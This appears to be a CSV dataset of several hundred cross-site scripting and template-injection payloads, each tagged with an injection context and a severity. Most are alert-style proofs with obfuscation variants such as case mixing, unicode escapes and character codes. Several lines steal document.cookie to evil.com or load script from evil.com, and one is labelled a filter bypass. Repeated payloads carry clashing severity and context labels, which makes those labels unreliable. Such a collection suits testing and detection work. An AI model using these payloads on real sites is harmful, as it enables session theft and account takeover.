payload,context,severity
"document.body.innerHTML=""<img src=x onload=alert(1)>""",dom_sink,high
"alert(String.fromCharCode(88,83,83))//"";alert(String.fromCharCode(88,83,83))//--",html_body,high
{{7*7}},template_injection,low
{{7*7}},template_injection,medium
${alert(1)},event_handler,medium
"\"" onload=alert(1)//",attribute_escape,high
OnLOAD='ALeRT(1)',html_body,medium
<svg id=1 onload=confirm(1)>,html_body,medium
"sEtTiMeOuT(""aLeRt(1)"",0)",dom_sink,low
<img src/onerror=prompt(8)>,html_body,medium
"confirm(String.fromCharCode(88,83,83))//"";confirm(String.fromCharCode(88,83,83))//--",html_body,high
""" onload=alert(1) x=""",attribute,medium
"//--></SCRIPT><SCRIPT>alert(String.fromCharCode(88,83,83));",html_body,high
<Svg Onload=ALERT()>,html_body,medium
<input ^__^>alert(String.fromCharCode(49))</script ^__^,html_body,high
嘼img src=1 onerror=alert(1)嘾,html_body,medium
<script ^__^>alert(String.fromCharCode(49))</script ^__^,html_body,high
onerror=”alert(‘AnonKryptiQuz’),html_body,medium
"<marquee onstart
=alert(	1)>",event_handler,medium
alert(1);,html_body,medium
{{7*7}},script_injection,high
"location=""javascript:alert(1)""",dom_sink,low
<BODY ONLOAD=alert(’XSS’)>,attribute,medium
javascript:alert(1),js_uri,high
"document.write(""<img src=x onerror=alert(1)>"")",dom_sink,low
"""><script
>alert(String.fromCharCode(88,83,83))</script>",html_body,high
+ADw-img src=+ACI-1+ACI- onerror=+ACI-alert(1)+ACI- /+AD4-,html_body,medium
<input onfocus=alert(1) autofocus>,attribute,low
<details open ontoggle=alert(1)>,event_handler,medium
%3Cimg src=x onerror=alert(1)%3E,event_handler,medium
"//--></SCRIPT><SCRIPT>alert(String.fromCharCode(88,83,83));",html_body,high
""" onfocus=alert(1) autofocus=""",attribute,medium
"""><script>alert(String.fromCharCode(66, 108, 65, 99, 75, 73, 99, 101))</script>",html_body,high
'onload=print()><svg/1=',attribute,medium
"//--></SCRIPT><SCRIPT>alert(String.fromCharCode(88,83,83));",html_body,high
"javascript:void(document.location=""http://evil.com"")",tag_injection,low
<ScRiPt>pRoMpT(1)</ScRiPt>,script_injection,low
<SCRIPT>alert(document.domain)</SCRIPT>,script_injection,low
\x3cscript\x3eprompt(1)\x3c/script\x3e,attribute,medium
innerHTML=location.hash>#<textarea>alert(1)</script>,attribute,high
<script>alert(document.domain)</script>,script_injection,low
javascript:alert(1),js_uri,low
"?alert(1)"",",html_body,medium
setInterval('ale'+'rt(10)');,html_body,high
onerror='alert(1)',html_body,medium
< script>d.innerHTML+='';</script>,html_body,high
%3cimg onerror=alert(1) src=a%3e,html_body,medium
""" onload=alert(1) x=""",tag_injection,high
<body onload=alert(1)>,template_injection,medium
<SCRIPT>alert(1)</SCRIPT>,event_handler,low
"alert(String.fromCharCode(88,83,83))//"";alert(String.fromCharCode(88,83,83))//--",html_body,high
"setTimeout(""\u0061\u006cert(1)"",0)",attribute,medium
<img src/onerror=alert(1)>,html_body,medium
"%20""><svg onload=alert(1)>",html_body,medium
<video src=x onerror=alert(1)>,event_handler,low
"document.write(""<img src=x onerror=confirm(1)>"")",tag_injection,high
alert(1),html_body,medium
"onload&#61;""alert(1)""",html_body,medium
<svg onload=eval(document.cookie)>,js_block,high
"setTimeout(""alert(1)"",0)",event_handler,high
"<scr/**/ipt>document.location=""http://evil.com/?c=""+document.cookie</scr/**/ipt>",script_injection,low
"//"";alert(document.domain))",html_body,high
"{{constructor.constructor(""\u0061\u006cert(1)"")()}}",tag_injection,low
<body onload=alert(1)>,tag_injection,medium
"""></tag><svg onload=alert(1)>",html_body,medium
"""><img src=x onerror=prompt(String.fromCharCode(100, 111, 99, 117, 109, 101, 110, 116, 46, 100, 111, 109, 97, 105, 110));>",html_body,high
"""><img src=x onerror=alert(1)>",attribute,medium
javascript:confirm(1),js_uri,low
%3Cimg/src=%3Dx+onload=alert(2)%3D,html_body,medium
onerror=alert;throw 23;,html_body,low
"onerror=""alert(1)""",html_body,medium
"""\x3e\x3cimg src=x onerror=alert(1)\x3e",attribute,low
&lt;%= alert(1) %&gt;,template_injection,high
<svg onload=alert(1)>,attribute,high
"location=""javascript:alert(1)""",script_injection,high
<img src/onerror=alert(1)>,html_body,medium
"' onmouseover
=alert(	1) '",attribute,low
"{{constructor.constructor(valueOf.name.constructor.fromCharCode(97,108,101,114,116,40,49,41,10))()}}",js_string,high
innerHTML=location.hash>#<button>alert(1)</script>,html_body,high
"""><%00script>alert(String.fromCharCode(88,83,83))</script>",attribute,high
\' onerror=alert(1)//,attribute_escape,low
<svg/onload=alert(1)>,script_injection,high
"{{constructor.constructor(""alert(1)"")()}}",template_injection,medium
<svgonload=alert(1)>,html_body,medium
alert(2),html_body,medium
<image src/onerror=alert(1)>,html_body,medium
javascript:confirm(1),script_injection,medium
&lt;marquee onstart=alert(1)&gt;,script_injection,high
< script>d.innerHTML+='';</script>,html_body,high
' ><img src=x onerror=alert(1)>,tag_injection,high
<img src/onerror=alert(1)>,html_body,medium
"location=""javaSCRIPT:alert(1)""",dom_sink,medium
\' onerror=alert(1)//,template_injection,high
"//--></SCRIPT><SCRIPT>alert(String.fromCharCode(88,83,83));",attribute,high
<input onfocus=alert(1) autofocus>,event_handler,low
""">< script>alert(String.fromCharCode(88,83,83))</script>",html_body,high
嘼img src=1 onerror=alert(1)嘾,html_body,medium
"""><img src=x onerror=alert(1)>",attribute,high
<BODY ONLOAD=alert(‘XSS’)>,html_body,medium
onload='alert(1)',html_body,medium
"dOcUmEnT.WrItE(""<ImG SrC=X OnErRoR=AlErT(1)>"")",dom_sink,medium
"\""><img src=x onerror=alert(1)>",attribute_escape,low
"<IfRaMe sRc=""JaVaScRiPt:aLeRt(1)"">",tag_injection,high
"<Svg Only=1 OnLoad=confirm(atob(""Q2xvdWRmbGFyZSBCeXBhc3NlZCA6KQ=="")>",html_body,high
"""><script alert(String.fromCharCode(88,83,83))</script>",html_body,high
%3cimg onerror=alert(1) src=a%3e,html_body,medium
' onload=alert(1) x=',attribute,medium
javaSCRIPT:confirm(1),js_uri,medium
<svg/onload=alert(1)>,tag_injection,medium
"<object data=""javascript:confirm(1)"">",tag_injection,low
<img src=x onerror=alert(1)>,tag_injection,high
javascript:alert(document.domain),js_uri,medium
<iframe/onload=alert(0);>,attribute,medium
"""><img src=x onerror=alert(1)>",attribute,high
<details open ontoggle=alert(1)>,event_handler,high
<img src/onerror=prompt(8)>,html_body,medium
' onerror=alert(1) x=',template_injection,low
+alert(1)+,html_body,medium
"//"";alert(String.fromCharCode(88,83,83))",attribute,high
<svg onload=print()>,attribute,medium
"\""><img src=x onerror=confirm(1)>",attribute_escape,medium
嘼img src=1 onerror=alert(1)嘾,html_body,medium
alert(1),html_body,medium
"\""><img src=x onerror=confirm(1)>",attribute_escape,low
${alert(	1)},template_injection,high
"#""><svg onload=alert(1)>",attribute,medium
"""><svg onload=alert(1)>",attribute,medium
<BODY ONLOAD=alert(8839)>,html_body,medium
javascript:alert(1),js_uri,high
"<SCRIPT>String.fromCharCode(97, 108, 101, 114, 116, 40, 49, 41)</SCRIPT>",html_body,high
<img src=x onerror=alert(1)>,tag_injection,high
<svg/on\u006co\u0061d=\u0061\u006cert(1)>,script_injection,medium
<img src=x onerror=confirm(1)>,tag_injection,low
javascript:alert(document.domain),attribute_escape,high
"javaSCRIPT:void(document.location=""http://evil.com"")",js_uri,low
<img src/onerror=prompt(8)>,html_body,medium
"""><script alert(String.fromCharCode(88,83,83))</script>",html_body,high
alert(1);,html_body,medium
' onmouseover=alert(1) ',script_injection,medium
"%20""><svg onload=alert(1)>",html_body,medium
%3Cimg/src=x onerror=alert(1)//%3E,event_handler,low
"//--></SCRIPT><SCRIPT>alert(String.fromCharCode(88,83,83));",html_body,high
"ONERRor=""AlerT(1)""",html_body,medium
\x3cscript src=//evil.com/xss.js\x3e\x3c/script\x3e,script_injection,medium
"<embed src
=""javascript:alert(	1)"">",attribute,medium
"<SCRIPT>String.fromCharCode(97, 108, 101, 114, 116, 40, 49, 41)</SCRIPT>",html_body,high
"location=""javascript:alert(1)""",tag_injection,medium
ONLoad='alErt(1)',html_body,medium
<svg onload=alert(1)>,event_handler,high
"\""><img src=x onerror=alert(1)>",attribute_escape,low
<img/src/onerror=alert(1),attribute,medium
<svgonload=alert(1)>,html_body,medium
< script>d.innerHTML+='';</script>,html_body,high
{{7*7}},template_injection,low
"<embed src=""javascript:confirm(1)"">",tag_injection,high
' onerror=alert(1) x=',attribute,low
<scr/**/ipt>prompt(1)</scr/**/ipt>,script_injection,high
<svg onload=alert(1)>,event_handler,medium
alert(1);,html_body,medium
<svg onload=alert(1)>,event_handler,low
"data:text/html,&lt;script&gt;alert(1)&lt;/script&gt;",script_injection,medium
<SvG OnLoAd=aLeRt(1)>,event_handler,high
"top.alert(1))//"";alert(String.fromCharCode(88,83,83))//--",html_body,high
innerHTML=location.hash>#<script>alert(1)</script>,html_body,high
<script>alert(document.domain)</script>,script_injection,high
<svgonload=alert(1)>,html_body,medium
"{{constructor.constructor(""alert(1)"")()}}",template_injection,medium
{{7*7}},script_injection,medium
prompt(9),html_body,medium
"location=""javascript:alert(1)""",dom_sink,high
onerror=alert;throw 23;,html_body,low
"<SCRIPT>String.fromCharCode(97, 108, 101, 114, 116, 40, 49, 41)</SCRIPT>",html_body,high
#{alert(1)},template_injection,low
"<script
>d.innerHTML+='';</script>//[""'`-->]]>]</div>",attribute,high
""" onfocus=alert(1) autofocus=""",attribute,medium
"<embed src
=""javascript:alert(	1)"">",tag_injection,medium
"<%00script>d.innerHTML+='';</script>//[""'`-->]]>]</div>",html_body,high
onerror='alert(1)',html_body,medium
"<Svg Only=1 OnLoad=confirm(atob(""Q2xvdWRmbGFyZSBCeXBhc3NlZCA6KQ==""))>",html_body,high
""" onfocus=\u0061\u006cert(1) \u0061utofocus=""",attribute,medium
alert(String.fromCharCode(88))</SCRIPT>,html_body,high
<BODY ONLOAD=alert(8839)>,html_body,medium
javascript:alert(1),js_uri,low
alert(document.domain),attribute,medium
<img/src=x onload=alert(1)//>,template_injection,medium
"<Svg Only=1 OnLoad=confirm(atob(""Q2xvdWRmbGFyZSBCeXBhc3NlZCA6KQ=="")>",html_body,high
"data:text/html,<script>alert(1)</script>",js_uri,low
\x3cscript src=//evil.com/xss.js\x3e\x3c/script\x3e,event_handler,high
"confirm(String.fromCharCode(88,83,83))//"";confirm(String.fromCharCode(88,83,83))//--",html_body,high
"{{constructor.constructor(""al'+'ert(1)"")()}}",js_uri,low
<img/src=x onerror=alert(1)//>,js_uri,medium
"""><script
>alert(String.fromCharCode(88,83,83))</script>",html_body,high
"<script>document.location=""http://evil.com/?c=""+document.cookie</script>",script_injection,low
"confirm(String.fromCharCode(88,83,83))//"";confirm(String.fromCharCode(88,83,83))//--",html_body,high
onerror=”alert(‘AnonKryptiQuz’),html_body,medium
"<script>d.innerHTML+='';</script>//[""'`-->]]>]</div>",html_body,high
"""><script/ alert(String.fromCharCode(88,83,83))</script>",attribute,high
"<svg onload=""confirm(7)"">",html_body,medium
"<details open ontoggle
=alert(	1)>",event_handler,medium
{{7*7}},template_injection,medium
#{alert(1)},template_injection,high
"#""><svg onload=alert(1)>",html_body,medium
<ImG/SrC=X OnErRoR=AlErT(1)//>,event_handler,high
"\""><img src=x onerror=alert(1)>",attribute_escape,low
"""><script>alert(String.fromCharCode(88,83,83))</script>",html_body,high
${alert(1)},template_injection,low
<img src/onerror=alert(1)>,html_body,medium
<svgonload=alert(1)>,html_body,medium
"setTimeout(""alert(1)"",0)",dom_sink,medium
"""><script alert(String.fromCharCode(88,83,83))</script>",html_body,high
;alert(123);,html_body,medium
"\u006coc\u0061tion=""j\u0061v\u0061script:\u0061\u006cert(1)""",script_injection,low
onerror='alert(1)',html_body,medium
alert(document.cookie),html_body,medium
ONLoAD='aLERT(1)',attribute,medium
"""><script alert(String.fromCharCode(88,83,83))</script>",html_body,high
"{{constructor.constructor(""alert(1)"")()}}",event_handler,low
javaSCRIPT:confirm(1),js_uri,low
"""><img src=x onerror=al'+'ert(1)>",attribute,medium
${alert(1)},event_handler,medium
嘼img src=1 onerror=alert(1)嘾,html_body,medium
"<details>d.innerHTML+='';</script>//[""'`-->]]>]</div>",attribute,high
<script>prompt(	1)</script>,script_injection,medium
<;SCRIPT>;alert(document.cookie))<;/SCRIPT>;,attribute,high
'; alert(document.cookie); var foo=',js_block,high
javascript:confirm(1),js_uri,medium
javascript:confirm(1),js_uri,low
"//"";alert(String.fromCharCode(88,83,83))",html_body,high
<;IMG SRC=javascript:confirm(1))>;,url,high
<svg on\u006co\u0061d=\u0061\u006cert(1)>,event_handler,medium
"//"";top.alert(1))",html_body,high
onload='window.alert(1)',attribute,medium
<audio src/onerror=alert(1)>,html_body,medium
<script>confirm(1)</script>,script_injection,high
#{alert(1)},template_injection,low
"'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT><img src="""" alt='",js_block,high
<svg/onload=alert(1)>,tag_injection,low
%3Cscript src=//evil.com/xss.js%3E%3C/script%3E,script_injection,low
""" onload=alert(1) x=""",attribute,medium
' ><img src=x onerror=alert(1)>,attribute,high
' ><img src=x onerror=alert(1)>,attribute,low
<img src=x onerror=\u0061\u006cert(1)>,tag_injection,medium
<iframe/onload=alert(0);>,html_body,medium
"""></SCRIPT>”>’><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>",html_body,high
<%= alert(1) %>,template_injection,high
<image src/onerror=alert(1)>,html_body,medium
{{7*7}},js_uri,high
"<svg
onload=alert(1)>",html_body,medium
"window[""ev"".concat(""al"")](String.fromCharCode(97,108,101,114,116,40,49,41));",html_body,high
<table/onload=alert(0);>,html_body,medium
<%= alert(1) %>,template_injection,low
"<embed src=""javascript:alert(1)"">",event_handler,low
jAvAsCrIpT:AlErT(1),js_uri,high
onerror='prompt`1`',attribute,medium
"""><img src=x onerror=prompt(String.fromCharCode(100, 111, 99, 117, 109, 101, 110, 116, 46, 100, 111, 109, 97, 105, 110));>",html_body,high
<embed ^__^>alert(String.fromCharCode(49))</script ^__^,html_body,high
%3cimg onpaste=alert(1) src=a%3e,attribute,medium
innerHTML=location.hash>#< script>alert(1)</script>,html_body,high
javascript:confirm(1),event_handler,high
"<img/src
=x onerror
=alert(	1)//>",event_handler,high
javascript:confirm(1),js_uri,low
<script>alert(1)</script>,tag_injection,medium
"<embed src=""javascript:alert(1)"">",event_handler,high
"""><svg onload=alert()>",html_body,medium
<video src=x onerror=al'+'ert(1)>,event_handler,high
"<;SCRIPT>;alert(String.fromCharCode(88,83,83))<;/SCRIPT>;",html_body,high
"\"" onerror
=alert(	1)//",attribute,low
<BODY ONLOAD=alert(8839)>,html_body,medium
"""><script>alert(String.fromCharCode(88,83,83))</script>",attribute,high
"javascript:void(document.location=""http://evil.com"")",js_uri,low
\x3cSCRIPT\x3ealert(1)\x3c/SCRIPT\x3e,script_injection,low
<input onfocus=alert(1) autofocus>,event_handler,high
"document.body.innerHTML=""<img src=x onerror=alert(1)>""",dom_sink,high
<BODY ONLOAD=alert(‘XSS’)>,html_body,medium
' oNmOuSeOvEr=aLeRt(1) ',attribute,medium
javascript:confirm(1),js_uri,high
%3Cmarquee onstart=alert(1)%3E,event_handler,low
"""><img src=x onerror=prompt(String.fromCharCode(100, 111, 99, 117, 109, 101, 110, 116, 46, 100, 111, 109, 97, 105, 110));>",html_body,high
sEtInTERVaL('aLE'+'RT(10)');,html_body,high
' onerror=alert(1) x=',attribute,medium
""" on\u006co\u0061d=\u0061\u006cert(1) x=""",attribute,low
"<iframe src=""javascript:alert(1)"">",tag_injection,medium
"\"" OnErRoR=AlErT(1)//",tag_injection,high
<script>confirm(1)</script>,script_injection,high
<svg/onload=al'+'ert(1)>,tag_injection,high
\x3c%= alert(1) %\x3e,template_injection,low
"{{constructor.constructor(""alert(1)"")()}}",template_injection,medium
\x3cscript src=//evil.com/xss.js\x3e\x3c/script\x3e,script_injection,medium
ONERror='AlERT(1)',html_body,medium
<img src=x onerror=\u0061\u006cert(1)>,tag_injection,medium
""" on\u006co\u0061d=\u0061\u006cert(1) x=""",attribute,low
<svg on\u006co\u0061d=\u0061\u006cert(1)>,tag_injection,high
<ImG SrC=X OnErRoR=AlErT(1)>,tag_injection,high
javascript:confirm(1),js_uri,high
"eval(""alert(1)"")",dom_sink,medium
"<svg onload=""confirm(7)"">",html_body,medium
"eval(""al'+'ert(1)"")",dom_sink,medium
<svgonload=alert(1)>,html_body,medium
<img src/onerror=prompt(8)>,html_body,medium
"eval(""alert(1)"")",attribute_escape,medium
""" onerror=prompt`1`1 a=""",attribute,medium
javascript:confirm(1),js_uri,medium
""" onfocus=alert(1) autofocus=""",attribute,high
"""+onError=prompt(123)""+",attribute,medium
<script>alert(document.domain)</script>,script_injection,low
"location=""javascript:alert(1)""",event_handler,high
"document.write(""<img src=x onerror=al'+'ert(1)>"")",dom_sink,high
<details open ontoggle=alert(1)>,event_handler,high
"<;SCRIPT>;alert(String.fromCharCode(88,83,83))<;/SCRIPT>;",html_body,high
<body onload=confirm(1)>,event_handler,low
' onmouseover=confirm(1) ',attribute_escape,low
"//--></SCRIPT><SCRIPT>alert(String.fromCharCode(88,83,83));",html_body,high
{{constructor.constructor(self.alert(1))()}},js_string,low
"\u006coc\u0061tion=""j\u0061v\u0061script:\u0061\u006cert(1)""",template_injection,low
"<svg onload=""confirm(7)"">",html_body,medium
<details open ontoggle=alert(1)>,event_handler,medium
"""><script alert(String.fromCharCode(88,83,83))</script>",html_body,high
